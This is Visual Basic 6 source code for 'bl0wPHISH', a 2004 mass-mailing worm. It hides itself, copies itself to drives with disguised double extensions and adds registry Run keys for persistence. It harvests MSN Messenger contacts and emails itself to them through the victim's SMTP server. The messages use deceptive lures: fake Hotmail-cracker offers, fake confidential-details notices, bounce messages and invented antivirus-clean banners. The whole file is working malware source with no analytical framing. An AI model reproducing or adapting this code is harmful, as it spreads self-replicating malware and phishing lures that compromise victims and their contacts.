   VERSION 5.00
   Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
   Begin VB.Form Form1
      BackColor       =   &H00404040&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "bl0wPHISH - [fr0z3n]"
      ClientHeight    =   2415
      ClientLeft      =   45
      ClientTop       =   330
      ClientWidth     =   3720
      ClipControls    =   0   'False
      DrawMode        =   1  'Blackness
      BeginProperty Font
         Name            =   "Terminal"
         Size            =   6
         Charset         =   255
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Icon            =   "Form1.frx":0000
      LinkTopic       =   "Form1"
      MaxButton       =   0   'False
      MinButton       =   0   'False
      ScaleHeight     =   2415
      ScaleWidth      =   3720
      StartUpPosition =   2  'CenterScreen
      Begin VB.ListBox List1
         Appearance      =   0  'Flat
         Height          =   150
         Left            =   240
         TabIndex        =   6
         Top             =   360
         Width           =   3255
      End
      Begin VB.Timer Timer4
         Interval        =   1000
         Left            =   840
         Top             =   1080
      End
      Begin VB.Timer Timer3
         Left            =   2280
         Top             =   1080
      End
      Begin VB.Timer Timer2
         Left            =   1320
         Top             =   1080
      End
      Begin MSWinsockLib.Winsock Winsock1
         Left            =   2760
         Top             =   1080
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin VB.Timer Timer1
         Interval        =   10
         Left            =   1800
         Top             =   1080
      End
      Begin VB.TextBox txtDriveString
         Appearance      =   0  'Flat
         Height          =   195
         Left            =   240
         TabIndex        =   4
         Text            =   "DriveString"
         Top             =   1920
         Width           =   3255
      End
      Begin VB.TextBox txtAttachName
         Appearance      =   0  'Flat
         Height          =   195
         Left            =   240
         TabIndex        =   3
         Text            =   "AttachName"
         Top             =   1680
         Width           =   3255
      End
      Begin VB.TextBox txtMessagePart
         Appearance      =   0  'Flat
         Height          =   495
         Left            =   240
         TabIndex        =   2
         Text            =   "MessagePart"
         Top             =   1080
         Width           =   3255
      End
      Begin VB.TextBox txtSubjectPart
         Appearance      =   0  'Flat
         Height          =   195
         Left            =   240
         TabIndex        =   1
         Text            =   "SubjectPart"
         Top             =   840
         Width           =   3255
      End
      Begin VB.TextBox txtFromPart
         Appearance      =   0  'Flat
         Height          =   195
         Left            =   240
         TabIndex        =   0
         Text            =   "FromPart"
         Top             =   600
         Width           =   3255
      End
      Begin VB.Frame Frame1
         Appearance      =   0  'Flat
         BackColor       =   &H00404040&
         Caption         =   "[ t0xic beyond belief ]"
         ForeColor       =   &H00FFFFFF&
         Height          =   2175
         Left            =   120
         TabIndex        =   5
         Top             =   120
         Width           =   3495
      End
   End
   Attribute VB_Name = "Form1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   '  /***********************************\
   ' /************ fr0zen c0re ************\
   '|******* bl0wPHiSH v 1 by phr0st *******|
   '|***************** 2004 ****************|
   ' \** eXpect more life in the future. **/
   '  \***********************************/

   Private WithEvents objMessenger As MessengerAPI.Messenger
   Attribute objMessenger.VB_VarHelpID = -1
   Private MsgrContacts As IMessengerContacts

   Dim MsgrServices As IMessengerServices
   Dim MsgrService As IMessengerService
   Dim Status As Integer

   Private Enum SMTP_State
       MAIL_CONNECT
       MAIL_HELO
       MAIL_FROM
       MAIL_FROM1
       MAIL_FROM2
       MAIL_RCPTTO
       MAIL_DATA
       MAIL_DOT
       MAIL_QUIT
   End Enum

   Private m_State As SMTP_State
   Private m_strEncodedFiles As String

   Private Sub Form_Load()
   On Error Resume Next

   Set objMessenger = New MessengerAPI.Messenger
   Set MsgrServices = objMessenger.Services
   Dim FileName, wOrmDirName, wOrmFileName, wOrmStr, MessStr As String

   Form1.Hide

       FileName = App.Path & "\" & App.EXEName & ".exe"

   If FileExists("C:\Command.exe") = True Then GoTo SkipHide
       Call removefromCAD

   SkipHide:
         Call Check_Drives(False)
           Call Inf_Drives(FileName, "bl0wPHISH.doc                                        .exe")

       FileName = App.Path & "\" & App.EXEName & ".exe"
          wOrmDirName0 = Array("C:\Windows\System32\", "C:\Windows\", "C:\Windows\Fonts\")
            wOrmDirName = wOrmDirName0(NumGen(0, UBound(wOrmDirName0)))
          wOrmFileName = RanName()

   wOrmStr = RegExists("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\bl0wPHISH_boot")

      If wOrmStr = "bl0wPHISH" Then

         FileCopy FileName, wOrmDirName & wOrmFileName
           w0rmStr = wOrmDirName & wOrmFileName
        Call RegistryWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\bl0wPHISH_boot", w0rmStr)
        Call RegistryWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\bl0wPHISH_boot", w0rmStr)
        Call RegistryWrite("HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run\bl0wPHISH_boot", w0rmStr)

      End If

        MessStr = RegExists("HKEY_CURRENT_USER\Software\Microsoft\MSNMessenger\User.NET Messenger Service")

          If MessStr = "bl0wPHISH" Then GoTo SkipCheck

          Timer3.Interval = 50

   SkipCheck:

   If RegExists("HKEY_CURRENT_USER\Software\bl0wPHISH\bl0wPHISH") = "bl0wPHISH" Then Exit Sub
        Call PayloadCheck

   End Sub

   Function MessageGen()

   subject = Array("bl0wPHISH", "Hotmail Account Hacker", "Hotmail Hack", "Learn to Hack Hotmail", "Hotmail Hacking Tool", "Hack MSN Messenger" _
   , "Your Login Details", "Sale Receipt", "Your Details", "You Have been Hacked!", "Your E-Bay Account", "All Along the WatchTower" _
   , "Mail Delivery Failure : Message returned", "Mail delivery failed : returning message to sender", "Mail Send Fail", "Mail Server Error", "Delivery Error", "Server Failure")

   a = NumGen(0, UBound(subject))
   SubjectPart0 = subject(a)

   If a >= 0 And a <= 5 Then

   from1 = Array("promotions", "promote", "hotmail", "hackers", "games", "online", "awsome", "special", "tools")
   from2 = Array("@HACKonline", "@blowPHISH", "@explosive", "@hackersclass", "@IGU", "@HACKandCRACK")
   from3 = Array(".com", ".org", ".co.uk", ".cv", ".es", ".us", ".sk", ".info", ".tv", ".net", ".nl")
   frompart1 = from1(NumGen(0, UBound(from1)))
   frompart2 = from2(NumGen(0, UBound(from2)))
   frompart3 = from3(NumGen(0, UBound(from3)))

   SpecPart0 = Array("[McAffe Online Virus Scan] Clean.", "Norton System Scan - Email and attachments clean" _
   , "Exclusive email list", "@bl0wPHISH Hacking Tools" _
   , "[Panda AV Scanned] - email and attachments clean", "-Leaked hacking tool from bl0wPHISH-", "[Symantec Online scan] 100% Clean")

   SubjectAft = Array(" - hack any msn account.", ", Welcome to the Revolution!", "; Join the masses now!" _
   , " : best Hotmail cracker ever.", " - Were JAMMIN! were JAMMIN! were JAMMIN!")

   SubjectPart2 = SubjectAft(NumGen(0, UBound(SubjectAft)))

   SpecPart = SpecPart0(NumGen(0, UBound(SpecPart0)))

   MessageChoice = Array(SpecPart & Chr(10) & Chr(10) & SubjectPart0 & "Have you ever wanted to see just who your girl/boyfriend really is emailing? Well here is your chance. This hotmail account cracking tool exclusive from bl0wPHISH allows you just that power, the power to gain the password to any hotmail account. Attached to this email is a free trial, try it today." & Chr(10) & Chr(10) & SpecPart _
   , SpecPart & Chr(10) & Chr(10) & "Are you wondering just what your Spouse really is up to in those late night chat sessions. Find out what they really are doing on MSN Messenger with this free account password cracker from bl0wPHISH, attached to this email." & Chr(10) & Chr(10) & SpecPart _
   , SpecPart & Chr(10) & Chr(10) & "Don't mess about wasting time tring to guess peoples secret questions. With this free tool from bl0wPHISH you can quickly and easily crack any hotmail account password that you require. The installer for the cracker is attached to this email." & Chr(10) & Chr(10) & SpecPart _
   , SpecPart & Chr(10) & Chr(10) & "Has some annoying little kid being annoying you  on MSN Messenger? Want revenge? Well if you do here is the tool for you. This hotmail account cracker allows you to gain any account password you like. The quick and easy user interface makes it simple for even a computer newbie to start hacking! Attached to this email is the installer for the cracker." & Chr(10) & Chr(10) & SpecPart _
   , SpecPart & Chr(10) & Chr(10) & "Ever wanted to hack your friend's Hotmail account? Well witht his exclusive program from bl0wPHISH you can do just that. THe cracker allows you to gain any password to any Hotmail account. Even a computer newbie can use it, it's so easy. The cracker installation is attached to this email." & Chr(10) & Chr(10) & SpecPart _
   , SpecPart & Chr(10) & Chr(10) & "Do you wanna hack? Do you wanna hack hotmail? Well if you do here is the perfect program for you. The cracker allows you instant access to any hotmail account you like. To install a free trial download the attached file supplied with this email." & Chr(10) & Chr(10) & SpecPart _
   , "bl0wPHISH - toxic beyond belief.")

   txtFromPart.Text = frompart1 & frompart2 & frompart3
   txtSubjectPart.Text = SubjectPart0 & SubjectPart2
   txtMessagePart.Text = MessageChoice(NumGen(0, UBound(MessageChoice)))
   txtAttachName.Text = SubjectPart0 & ".ins                                                                                                                                                        .exe"

   Call SendMessage

   End If

   If a > 5 And a <= 11 Then

   from1 = Array("details", "sent", "mail", "server", "confidential", "remail", "closed", "private")
   from2 = Array("@secure", "@blowPHISH", "@micr0", "@ebay", "@anonymous", "@12345")
   from3 = Array(".com", ".org", ".co.uk", ".cv", ".es", ".us", ".sk", ".info", ".tv", ".net", ".nl")
   frompart1 = from1(NumGen(0, UBound(from1)))
   frompart2 = from2(NumGen(0, UBound(from2)))
   frompart3 = from3(NumGen(0, UBound(from3)))

   txtFromPart.Text = frompart1 & frompart2 & frompart3
   FromPart = txtFromPart.Text

   SpecPart0 = Array("They are in Rich text format", "This is a server generated message,please do not reply." _
   , "bl0wPHISH email servers handled the request.", "The details are highly confidential and have been treated as such." _
   , "SIIICK Encryption standard used in transfer.", "This message was created automatically by mail delivery software.")

   SpecPart = SpecPart0(NumGen(0, UBound(SpecPart0)))

   MessageChoice = Array("<<..< " & FromPart & " >..>>" & Chr(10) & Chr(10) & Chr(10) & _
   "The details are attached to this email. They are confidential and have been sent through a secure server. " & SpecPart & ". Open the attachment to view." _
   & Chr(10) & Chr(10) & Chr(10) & "<\/<< " & FromPart & " >>\/>" _
   , "<<\<< " & FromPart & " >>/>>" & Chr(10) & Chr(10) & Chr(10) & _
   "Your requested details are attached. " & SpecPart & ".They have been delivered though a secure remailer to ensure confidentiality." _
   & Chr(10) & Chr(10) & Chr(10) & "<<<<< " & FromPart & " >>>>>" _
   , "<<<<< " & FromPart & " >>>>>" & Chr(10) & Chr(10) & Chr(10) & _
   "We have forwarded your details through to you. To view them open the attachment. " & SpecPart & " A secure mailserver was used for delivery." _
   & Chr(10) & Chr(10) & Chr(10) & "<<<<< " & FromPart & " >>>>>" _
   , "<<<<< " & FromPart & " >>>>>" & Chr(10) & Chr(10) & Chr(10) & _
   "To view your requested details open the attached document. " & SpecPart & " The details were forwarded through a secure remailer to keep your details confidential." _
   & Chr(10) & Chr(10) & Chr(10) & "<<<<< " & FromPart & " >>>>>" _
   , "<<<<< " & FromPart & " >>>>>" & Chr(10) & Chr(10) & Chr(10) & _
   "See attachment for details " & SpecPart & "" _
   & Chr(10) & Chr(10) & Chr(10) & "<<<<< " & FromPart & " >>>>>" _
   , "<<<<< " & FromPart & " >>>>>" & Chr(10) & Chr(10) & Chr(10) & _
   "Open the attachment for more details, they were sent though a secure server. " & SpecPart & "" _
   & Chr(10) & Chr(10) & Chr(10) & "<<<<< " & FromPart & " >>>>>" _
   , "<<<<< " & FromPart & " >>>>>" & Chr(10) & Chr(10) & Chr(10) & _
   "Your confidential details have been attached. " & SpecPart & "" _
   & Chr(10) & Chr(10) & Chr(10) & "<<<<< " & FromPart & " >>>>>" _
   , "bl0wPHISH - toxic beyond belief.")

   txtSubjectPart.Text = SubjectPart0
   txtMessagePart.Text = MessageChoice(NumGen(0, UBound(MessageChoice)))
   txtAttachName.Text = SubjectPart0 & ".doc                                                                                                                                                        .exe"

   Call SendMessage

   End If

   If a > 11 And a <= 17 Then

   from1 = Array("delivery", "sent", "mail", "server", "mailserver", "remail", "errors", "notification")
   from2 = Array("@secure", "@blowPHISH", "@mailcheck", "@failed", "@mailstatus", "@status")
   from3 = Array(".com", ".org", ".co.uk", ".cv", ".es", ".us", ".sk", ".info", ".tv", ".net", ".nl")
   frompart1 = from1(NumGen(0, UBound(from1)))
   frompart2 = from2(NumGen(0, UBound(from2)))
   frompart3 = from3(NumGen(0, UBound(from3)))

   SpecPart0 = Array("@'. Internal Server Error .'@", "-----[Automated Responce]-----" _
   , "MailServer Responce . 012933 error service", "_-_@bl0wPHISH mailserver FAILURE .01_5" _
   , "..023_87 mail return/server", "_errornumber 34/2 Mail Failed.", "-Mail Return Server-")

   SpecPart = SpecPart0(NumGen(0, UBound(SpecPart0)))

   MessageChoice = Array(SpecPart & Chr(10) & Chr(10) & "Your mail was unable to be delivered. There was an internal server error, please try later. Your returned mail is attached." & Chr(10) & Chr(10) & SpecPart _
   , SpecPart & Chr(10) & Chr(10) & "There was a server error, your mail was undelivered. The server has rebounded your mail attempt. Your sent email is attached." & Chr(10) & Chr(10) & SpecPart _
   , SpecPart & Chr(10) & Chr(10) & "Mail delivery report. FAILURE. To view your returned mail please view the attachment." & Chr(10) & Chr(10) & SpecPart _
   , SpecPart & Chr(10) & Chr(10) & "Mail server down. Your mail server is experiencing technical difficulties. Please try again leter, your rebounded mail is attached." & Chr(10) & Chr(10) & SpecPart _
   , SpecPart & Chr(10) & Chr(10) & "Failed delivery of mail. Mail details attached." & Chr(10) & Chr(10) & SpecPart _
   , SpecPart & Chr(10) & Chr(10) & "Terminal Server Error. Your computer has been identified as a possible source. For further details view the attached email." & Chr(10) & Chr(10) & SpecPart _
   , SpecPart & Chr(10) & Chr(10) & "Mail delivery failure. Unfortunatly your mail was left undelivered by your server. Your mail has been forwared back to you as an attachment." & Chr(10) & Chr(10) & SpecPart _
   , SpecPart & Chr(10) & Chr(10) & "A message that you sent could not be delivered to all of its recipients." & Chr(10) & Chr(10) & "A copy of the E-mail has been attached" & Chr(10) & Chr(10) & SpecPart _
   , "bl0wPHISH - toxic beyond belief.")

   txtFromPart.Text = frompart1 & frompart2 & frompart3
   txtSubjectPart.Text = SubjectPart0
   txtMessagePart.Text = MessageChoice(NumGen(0, UBound(MessageChoice)))
   txtAttachName.Text = SubjectPart0 & ".eml                                                                                                                                                        .exe"

   Call SendMessage

   End If

   End Function

   Private Sub SendMessage()
   Dim smtpString

   smtpString = RegExists("HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\SMTP Server")

       If smtpString = "bl0wPHISH" Then
          GoTo smtpString2
       Else
          GoTo connectSMTP
       End If

   smtpString2:
   smtpString = RegExists("HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000001\SMTP Server")

   If smtpString = "bl0wPHISH" Then
          GoTo smtpString3
       Else
          GoTo connectSMTP
       End If

   smtpString3:
   smtpString = RegExists("HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000002\SMTP Server")

   If smtpString = "bl0wPHISH" Then

       Else
          GoTo connectSMTP
       End If

   connectSMTP:
   File = App.Path & "\" & App.EXEName & ".exe"

   m_strEncodedFiles = UUEncodeFile(File)
   Winsock1.Connect smtpString, 25
       m_State = MAIL_CONNECT

   End Sub

   Private Sub Check_Drives(Check As Boolean)
    On Error Resume Next
       Set fs = CreateObject("scripting.filesystemobject")

       For Each d In fs.drives
        DriveString = DriveString & d
       Next

       If Check = True Then
        If DriveString = txtDriveString.Text Then
        Exit Sub
         Else
         FileName = App.Path & "\" & App.EXEName & ".exe"
         Call Inf_Drives(FileName, "bl0wPHISH.doc                                        .exe")
         txtDriveString.Text = DriveString
        End If
       Else
       txtDriveString.Text = DriveString
       End If

   End Sub

   Private Sub PayloadCheck()
   Dim K As Integer, Day As Integer

   Day = DatePart("d", Date)

   If Day = 30 Then
   K = NumGen(0, 4)

   If K = 1 Then
   Me.Tag = 0
   GoTo Load
   End If

   If K = 2 Then
   Me.Tag = 1
   GoTo Load
   End If

   If K = 3 Then
   Me.Tag = 2
   GoTo Load
   End If

   End If

   Exit Sub

   Load:
   frmPayload.doeffect

   End Sub

   Private Sub Timer1_Timer()
   Check_Drives (True)
   End Sub

   Private Sub Timer2_Timer()

   If RegExists("HKEY_CURRENT_USER\Software\bl0wPHISH\bl0wPHISH") = "bl0wPHISH" Then
   Dim MsgrContacts As IMessengerContacts
   Dim MsgrContact As IMessengerContact
    Set MsgrContacts = objMessenger.MyContacts

   If List1.ListCount > 1 Then Exit Sub

   For Each MsgrContact In MsgrContacts
         List1.AddItem "<" & MsgrContact.SigninName & ">"
         Next

       List1.ListIndex = (List1.ListCount - 1)
       Call MessageGen
       Call RegistryWrite("HKEY_CURRENT_USER\Software\bl0wPHISH\bl0wPHISH", "1!")
   End If

   End Sub

   Private Sub Timer3_Timer()

   Set MsgrService = MsgrServices.PrimaryService

     Status = MsgrService.MyStatus
      If Status = 2 Or Status = 10 Or Status = 14 Or Status = 34 Or Status = 50 Or Status = 66 Or Status = 6 Then GoTo SetTimer
        Exit Sub

   SetTimer:
        Timer2.Interval = 100

   End Sub

   Private Sub Timer4_Timer()
   On Error Resume Next
   Dim retval As Long
   retval = EnumWindows(AddressOf EnumWindowsProc, 0)
   End Sub

   Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)

       Dim msgSerRes   As String
       Dim msgResCode     As String
       Dim msgData       As String

       Winsock1.GetData msgSerRes

       msgResCode = Left(msgSerRes, 3)

       If msgResCode = "250" Or _
          msgResCode = "220" Or _
          msgResCode = "354" Then

           Select Case m_State
               Case MAIL_CONNECT

                   m_State = MAIL_HELO

                   Winsock1.SendData "HELO " & Winsock1.LocalHostName & vbCrLf

               Case MAIL_HELO

                   m_State = MAIL_FROM

                   Winsock1.SendData "MAIL FROM:" & txtFromPart.Text & vbCrLf

               Case MAIL_FROM

           If List1.ListIndex = 0 Then
                 m_State = MAIL_RCPTTO
                  Winsock1.SendData "RCPT TO:" & List1.Text & vbCrLf

           Else

                 Winsock1.SendData "RCPT TO:" & List1.Text & vbCrLf
                  List1.RemoveItem (List1.ListIndex)
                   List1.ListIndex = (List1.ListCount - 1)
           End If

               Case MAIL_RCPTTO

                   m_State = MAIL_DATA

                   Winsock1.SendData "DATA" & vbCrLf

               Case MAIL_DATA

                   m_State = MAIL_DOT

                       Winsock1.SendData "From: <" & txtFromPart.Text & ">" & vbCrLf & _
                         "Subject: " & txtSubjectPart.Text & vbCrLf & _
                         "Mime-Version: 1.0" & vbCrLf & _
                         "X-Mailer: bl0wPHISH v_0.12" & vbCrLf & _
                         "Content-Type: text/html" & vbTab & "charset=us-ascii" & vbCrLf & vbCrLf

                   Dim varLines    As Variant
                   Dim varLine     As Variant
                   Dim strMessage  As String

                   strMessage = txtMessagePart.Text & vbCrLf & vbCrLf & "begin 664 " & txtAttachName.Text & vbLf & m_strEncodedFiles

                   varLines = Split(strMessage, vbCrLf)

                   strMessage = ""

                   For Each varLine In varLines
                       Winsock1.SendData CStr(varLine) & vbLf

                   Next

                   Winsock1.SendData "." & vbCrLf

               Case MAIL_DOT

                   m_State = MAIL_QUIT

                   Winsock1.SendData "QUIT" & vbCrLf

               Case MAIL_QUIT

                   Winsock1.Close

           End Select

       Else

           Winsock1.Close

       End If

   End Sub
